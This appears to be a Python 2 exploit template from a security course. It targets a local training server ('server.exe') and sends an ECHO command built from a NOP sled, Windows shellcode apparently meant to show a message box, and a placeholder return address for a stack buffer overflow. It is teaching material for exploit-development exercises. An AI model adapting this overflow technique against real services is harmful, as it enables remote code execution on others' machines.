#!/usr/bin/env python
from socket import *
import struct

### 1. Connect to server.exe
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 4270))

###  2. Identify yourself 
# use the email address you're registered with in Canvas
email = "your_email_address"  
cmd = "USER %s" % (email)
s.sendall(cmd)

buf = s.recv(1024)  # receive response from server.exe and print it out
print buf.strip()


### 3. You can change HELP to a command that might aid your debugging efforts.
cmd = "HELP"
s.sendall(cmd)

buf = s.recv(1024)
print buf.strip()


### 4. Let's get the server to ECHO back our input

nopsled = "\x90" * 1 # adjust the length of the nopsled here

# shellcode for popping a messagebox
shellcode = "\x83\xc4\x70"
shellcode += "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
shellcode += "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
shellcode += "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
shellcode += "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
shellcode += "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
shellcode += "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x20\x20"
shellcode += "\x20\x01\x68\x35\x35\x31\x30\x68\x20\x54\x45\x4b\x89\xe1\xfe"
shellcode += "\x49\x0b\x31\xc0\x51\x50\xff\xd7"

# we use struct.pack to write the return address in little endian
# change 0x41414141 to the address you want to jump to
ret = struct.pack("<L", 0x41414141) 

# putting it all together
cmd = "ECHO " + nopsled + shellcode + ret

s.sendall(cmd)

buf = s.recv(1024)
print buf.strip()


### 5. If we haven't crashed the server, tell it to exit.
cmd = "QUIT"
s.sendall(cmd)

buf = s.recv(1024)
print buf.strip()
